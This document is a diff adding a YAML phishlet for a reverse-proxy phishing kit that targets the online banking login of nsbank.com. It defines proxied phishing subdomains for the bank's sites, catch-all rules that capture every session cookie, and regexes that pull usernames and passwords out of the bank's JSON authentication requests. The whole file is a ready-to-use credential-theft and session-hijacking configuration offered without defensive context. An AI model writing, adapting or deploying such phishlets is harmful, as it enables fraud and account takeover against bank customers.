@@ -1,0 +1,27 @@
+name: "nsbank.com"
+author: ""
+min_ver: "2.3.0"
+proxy_hosts:
+  - { phish_sub: "digitalbanking", orig_sub: "digitalbanking", domain: "nsbank.com", session: true, is_landing: true}
+  - { phish_sub: "www", orig_sub: "www", domain: "nsbank.com", session: true, is_landing: false}
+  - { phish_sub: "w3", orig_sub: "w3", domain: "nsbank.co", session: false, is_landing: false}
+sub_filters: []
+auth_tokens:
+  - domain: 'digitalbanking.nsbank.com'
+    keys: ['.*,regexp']
+  - domain: '.nsbank.com'
+    keys: ['.*,regexp']
+auth_urls:
+  - "/d3rest/v3/auth/challenge"
+credentials:
+  username:
+    key: ""
+    search: '"USER_NAME","response":"([^"]*)'
+    type: "json"
+  password:
+    key: ""
+    search: '"PASSWORD","response":"([^"]*)'
+    type: "json"
+login:
+  domain: "digitalbanking.nsbank.com"
+  path: "/#pre-auth/login"
